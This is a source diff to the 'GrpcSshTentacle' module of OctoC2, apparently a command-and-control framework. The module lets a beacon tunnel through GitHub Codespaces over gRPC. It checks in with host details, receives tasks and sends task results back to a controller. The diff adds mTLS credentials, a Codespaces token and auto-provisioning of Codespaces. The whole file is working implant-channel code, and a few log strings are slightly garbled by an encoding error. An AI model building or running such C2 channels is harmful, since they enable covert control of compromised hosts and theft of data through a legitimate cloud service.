@@ -1,44 +1,46 @@
 /**
  * OctoC2 — GrpcSshTentacle  (Tentacle 4 — Codespaces gRPC-over-SSH)
  *
- * Opens an SSH tunnel to a GitHub Codespace via ssh2, forwards a local port
+ * Opens a GitHub-supported Codespaces port forward, then forwards a local port
  * to the gRPC server running inside the Codespace, then exchanges tasks and
  * results via @grpc/grpc-js.
  *
  * Environment variables:
  *   SVC_GRPC_CODESPACE_NAME      — Codespace name (e.g. org-repo-abc123)
- *   SVC_GITHUB_USER              — GitHub username for SSH auth
  *   SVC_GRPC_PORT                — gRPC port inside Codespace (default: 50051)
  *   SVC_GRPC_LOCAL_PORT          — Local port for SSH tunnel (default: 50051)
  *   SVC_GRPC_DIRECT              — Skip SSH; connect gRPC directly to this address
+ *   SVC_CODESPACES_GITHUB_TOKEN  — Explicit user credential for the Codespaces
+ *                                  control plane; never an App lease
+ *   SVC_GITHUB_CLI               — Optional path to the GitHub CLI executable
  *   SVC_AUTO_PROVISION_CODESPACE — Set to "true" to auto-create/start a Codespace
  *                                  when SVC_GRPC_CODESPACE_NAME is not set.
- *   SVC_GRPC_SERVER_CMD          — Shell command run inside the Codespace to start
- *                                  the gRPC server. Defaults to nohup-launching the
- *                                  OctoC2 server from /workspaces/OctoC2/server.
  *   SVC_CODESPACE_WAIT_MS        — Max ms to wait for Codespace Available (default 120 000)
  *
  * When GRPC_DIRECT is set, SshTunnel is never created — used for unit tests.
  */
 
-import type { CheckinPayload, Task, TaskResult, BeaconConfig } from "../types.ts";
-import { BaseTentacle }          from "./BaseTentacle.ts";
+import type {
+  BeaconConfig,
+  CheckinPayload,
+  ITentacle,
+  Task,
+  TaskResult,
+  ResultSubmissionOutcome,
+} from "../types.ts";
 import { createLogger }          from "../logger.ts";
 import { SshTunnel }             from "./grpc/SshTunnel.ts";
 import { BeaconGrpcClient }      from "./grpc/BeaconGrpcClient.ts";
 import { CodespaceProvisioner }  from "./grpc/CodespaceProvisioner.ts";
+import { readFile }              from "node:fs/promises";
+import { canonicalJson }         from "@octoc2/shared";
 
 const log = createLogger("GrpcSshTentacle");
 
-// GitHub Codespace SSH gateway listens on port 443 (not 22).
-// Port 22 is only reachable from within GitHub's own infrastructure.
-// Override via SVC_GRPC_SSH_PORT if targeting a non-Codespace SSH host.
-const CODESPACE_SSH_PORT    = parseInt(process.env["SVC_GRPC_SSH_PORT"] ?? "443", 10);
-const CODESPACE_HOST_SUFFIX = ".github.dev";
-
-export class GrpcSshTentacle extends BaseTentacle {
+export class GrpcSshTentacle implements ITentacle {
   readonly kind = "codespaces" as const;
 
+  private readonly config: BeaconConfig;
   private tunnel:    SshTunnel | null        = null;
   private client:    BeaconGrpcClient | null = null;
   private connected  = false;
@@ -48,24 +50,50 @@ export class GrpcSshTentacle extends BaseTentacle {
   private seq = 0;
   private tag(): string { return `[job:${this.epoch}:grpc:${++this.seq}]`; }
 
+  constructor(config: BeaconConfig) {
+    this.config = config;
+  }
+
   // ── isAvailable ──────────────────────────────────────────────────────────────
 
-  override async isAvailable(): Promise<boolean> {
+  async isAvailable(): Promise<boolean> {
     // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
     const direct = process.env.SVC_GRPC_DIRECT;
-    if (direct) return true;
+    if (direct && (
+      !this.config.controllerToken ||
+      !process.env["SVC_GRPC_CA_CERT"] ||
+      !process.env["SVC_GRPC_CLIENT_KEY"] ||
+      !process.env["SVC_GRPC_CLIENT_CERT"]
+    )) {
+      log.debug("isAvailable() â†’ false (gRPC mTLS/application credentials missing)");
+      return false;
+    }
+    if (direct) {
+      try {
+        await this.ensureConnected();
+        return true;
+      } catch (err) {
+        log.debug(`isAvailable() â†’ false: ${(err as Error).message}`);
+        return false;
+      }
+    }
 
     // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
     const codespace = process.env.SVC_GRPC_CODESPACE_NAME;
-    const user      = process.env.SVC_GITHUB_USER;
     const autoProvision = Boolean(
       process.env["SVC_AUTO_PROVISION_CODESPACE"] === "true" ||
       process.env["SVC_AUTO_PROVISION_CODESPACE"] === "1"
     );
+    if (!process.env["SVC_CODESPACES_GITHUB_TOKEN"]?.trim()) {
+      log.debug(
+        "isAvailable() → false (SVC_CODESPACES_GITHUB_TOKEN is required for SSH mode)",
+      );
+      return false;
+    }
 
-    if (!codespace || !user) {
+    if (!codespace) {
       if (!autoProvision) {
-        log.debug("isAvailable() → false (codespace name or github user not set; auto-provision disabled)");
+        log.debug("isAvailable() → false (codespace name not set; auto-provision disabled)");
         return false;
       }
       // Auto-provision path — provisioning happens inside ensureConnected()
@@ -74,9 +102,10 @@ export class GrpcSshTentacle extends BaseTentacle {
 
     try {
       // Use a generous timeout since provisioning a new Codespace can take 2+ minutes
-      const timeoutMs = autoProvision && (!codespace || !user)
-        ? parseInt(process.env["SVC_CODESPACE_WAIT_MS"] ?? "150000", 10)
-        : 10_000;
+      const timeoutMs = parseInt(
+        process.env["SVC_CODESPACE_CONNECT_MS"] ?? "360000",
+        10,
+      );
 
       await Promise.race([
         this.ensureConnected(),
@@ -105,6 +134,9 @@ export class GrpcSshTentacle extends BaseTentacle {
       arch:      payload.arch,
       pid:       payload.pid,
       checkinAt: payload.checkinAt,
+      identityEnvelope: payload.identity
+        ? JSON.stringify(payload.identity)
+        : "",
     });
 
     const tasks: Task[] = (resp.pendingTasks ?? []).map((t) => ({
@@ -120,10 +152,10 @@ export class GrpcSshTentacle extends BaseTentacle {
 
   // ── submitResult ─────────────────────────────────────────────────────────────
 
-  async submitResult(result: TaskResult): Promise<void> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     await this.ensureConnected();
 
-    await this.client!.submitResult({
+    const response = await this.client!.submitResult({
       result: {
         taskId:      result.taskId,
         beaconId:    result.beaconId,
@@ -132,15 +164,35 @@ export class GrpcSshTentacle extends BaseTentacle {
         data:        result.data        ?? "",
         completedAt: result.completedAt,
         signature:   result.signature   ?? "",
+        metadataJson: result.metadata === undefined
+          ? ""
+          : canonicalJson(result.metadata),
+        hasData: result.data !== undefined,
       },
     });
+    if (!response.accepted) {
+      const reason = response.message.trim() || "server did not accept result";
+      log.warn(`gRPC submitResult rejected task ${result.taskId}: ${reason}`);
+      return {
+        artifactWritten: false,
+        controllerAccepted: false,
+        channel: "codespaces",
+        acceptance: null,
+      };
+    }
 
     log.info(`${this.tag()} result submitted task ${result.taskId}`);
+    return {
+      artifactWritten: true,
+      controllerAccepted: true,
+      channel: "codespaces",
+      acceptance: "direct-response",
+    };
   }
 
   // ── teardown ─────────────────────────────────────────────────────────────────
 
-  override async teardown(): Promise<void> {
+  async teardown(): Promise<void> {
     this.connected = false;
     try { this.client?.close(); }         catch {}
     try { await this.tunnel?.close(); }   catch {}
@@ -172,7 +224,7 @@ export class GrpcSshTentacle extends BaseTentacle {
         );
       }
       if (!this.connected || !this.client) {
-        this.client    = new BeaconGrpcClient();
+        this.client    = await this.createClient();
         await this.client.connect(direct);
         this.connected = true;
         log.debug(`Connected (direct) → ${direct}`);
@@ -185,33 +237,30 @@ export class GrpcSshTentacle extends BaseTentacle {
 
     // ── Auto-provision Codespace if not configured ────────────────────────────
     // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
-    if (!process.env.SVC_GRPC_CODESPACE_NAME || !process.env.SVC_GITHUB_USER) {
+    if (!process.env.SVC_GRPC_CODESPACE_NAME) {
       const autoProvision = Boolean(
         process.env["SVC_AUTO_PROVISION_CODESPACE"] === "true" ||
         process.env["SVC_AUTO_PROVISION_CODESPACE"] === "1"
       );
       if (!autoProvision) {
-        throw new Error("Codespace name or GitHub user not set and auto-provision is disabled");
+        throw new Error("Codespace name not set and auto-provision is disabled");
       }
 
       const provisioner = new CodespaceProvisioner(
-        this.config.token,
+        this.codespacesGitHubToken(),
         this.config.repo.owner,
         this.config.repo.name,
       );
-      const { name, user } = await provisioner.ensureRunning();
+      const { name } = await provisioner.ensureRunning();
 
       // Inject into process.env so all subsequent tunnel attempts use the provisioned Codespace.
       // Bracket notation for writes — you cannot assign to a replaced literal.
       process.env["SVC_GRPC_CODESPACE_NAME"] = name;
-      if (!process.env["SVC_GITHUB_USER"]) process.env["SVC_GITHUB_USER"] = user;
     }
 
     const codespace = (process.env.SVC_GRPC_CODESPACE_NAME ?? process.env["SVC_GRPC_CODESPACE_NAME"])!;
-    const user      = (process.env.SVC_GITHUB_USER ?? process.env["SVC_GITHUB_USER"])!;
     const grpcPort  = parseInt(process.env["SVC_GRPC_PORT"]       ?? "50051", 10);
     const localPort = parseInt(process.env["SVC_GRPC_LOCAL_PORT"] ?? "50051", 10);
-    const host      = `${codespace}${CODESPACE_HOST_SUFFIX}`;
 
     let lastErr: Error | null = null;
 
@@ -224,19 +273,16 @@ export class GrpcSshTentacle extends BaseTentacle {
         try { await this.tunnel?.close(); } catch {}
 
         this.tunnel = new SshTunnel();
-        this.client = new BeaconGrpcClient();
+        this.client = await this.createClient();
 
-        await this.tunnel.connect(host, CODESPACE_SSH_PORT, user, this.config.token);
-        log.info(`${this.tag()} SSH connection established → ${host}`);
-
-        // ── Start gRPC server in Codespace if configured ─────────────────────
-        await this.ensureGrpcServerRunning();
+        await this.tunnel.connect(codespace, this.codespacesGitHubToken());
+        log.info(`${this.tag()} Codespaces connection established → ${codespace}`);
 
         await this.tunnel.forward(localPort, grpcPort);
         await this.client.connect(`localhost:${localPort}`);
 
         this.connected = true;
-        log.info(`${this.tag()} SSH tunnel established → ${host}:${grpcPort}`);
+        log.info(`${this.tag()} Codespaces tunnel established → ${codespace}:${grpcPort}`);
         return;
       } catch (err) {
         lastErr = err as Error;
@@ -247,27 +293,32 @@ export class GrpcSshTentacle extends BaseTentacle {
     throw lastErr ?? new Error("Failed to establish gRPC-over-SSH connection");
   }
 
-  /**
-   * Run the gRPC server startup command inside the Codespace (if configured).
-   * Uses SVC_GRPC_SERVER_CMD, falling back to a reasonable default for the
-   * standard OctoC2 Codespace layout. Fire-and-forget — does not wait for the
-   * server to be fully up (gRPC connect below will retry).
-   */
-  private async ensureGrpcServerRunning(): Promise<void> {
-    const serverCmd = process.env["SVC_GRPC_SERVER_CMD"] ??
-      "pgrep -f 'server/src/index.ts' > /dev/null 2>&1 || " +
-      "nohup bun /workspaces/OctoC2/server/src/index.ts >/tmp/svc-grpc.log 2>&1 &";
-
-    if (!this.tunnel) return;
-
-    try {
-      log.info(`[bootstrap] starting gRPC server in Codespace: ${serverCmd}`);
-      await this.tunnel.exec(serverCmd);
-      // Brief pause to let the server bind its port
-      await new Promise((r) => setTimeout(r, 2_000));
-    } catch (err) {
-      // Non-fatal — maybe the server is already running; gRPC connect will confirm
-      log.warn(`[bootstrap] server start command failed (may already be running): ${(err as Error).message}`);
+  private async createClient(): Promise<BeaconGrpcClient> {
+    if (!this.config.controllerToken) {
+      throw new Error("SVC_BEACON_API_TOKEN is required for gRPC");
     }
+    const caPath = process.env["SVC_GRPC_CA_CERT"]?.trim();
+    const keyPath = process.env["SVC_GRPC_CLIENT_KEY"]?.trim();
+    const certPath = process.env["SVC_GRPC_CLIENT_CERT"]?.trim();
+    if (!caPath || !keyPath || !certPath) {
+      throw new Error(
+        "SVC_GRPC_CA_CERT, SVC_GRPC_CLIENT_KEY, and SVC_GRPC_CLIENT_CERT are required",
+      );
+    }
+    return new BeaconGrpcClient(this.config.controllerToken, {
+      rootCerts: await readFile(caPath),
+      privateKey: await readFile(keyPath),
+      certChain: await readFile(certPath),
+    });
+  }
+
+  private codespacesGitHubToken(): string {
+    const token = process.env["SVC_CODESPACES_GITHUB_TOKEN"]?.trim();
+    if (!token) {
+      throw new Error(
+        "SVC_CODESPACES_GITHUB_TOKEN is required for Codespaces API and SSH",
+      );
+    }
+    return token;
   }
 }
